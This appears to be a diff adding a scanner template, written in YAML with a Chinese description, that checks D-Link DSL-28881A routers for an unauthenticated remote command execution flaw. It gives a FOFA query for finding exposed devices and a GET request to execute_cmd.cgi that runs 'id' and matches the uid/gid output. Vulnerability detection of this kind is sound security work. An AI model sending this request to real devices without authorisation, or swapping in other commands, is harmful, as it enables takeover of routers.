@@ -1,0 +1,19 @@
+id: dlink-dsl-28881a-rce
+
+info:
+  name: D-Link DSL-28881A 远程命令执行
+  author: daffainfo
+  severity: critical
+  description: |
+    D-Link DSL，集无线、ADSL、路由、交换机、防火墙五大功能，DSL是一款带有路由功能的ADSL2/2+终端，它通过以太网接口与计算机相连，具有强大的路由功能。D-Link路由器系统存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限。
+    fofa-query: body="DSL-2888A"
+  reference:
+    - https://mp.weixin.qq.com/s/_BX38i-IqrpsvNx4_LyH5g
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/execute_cmd.cgi?timestamp=test&cmd=id
+    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
+expression: r0()
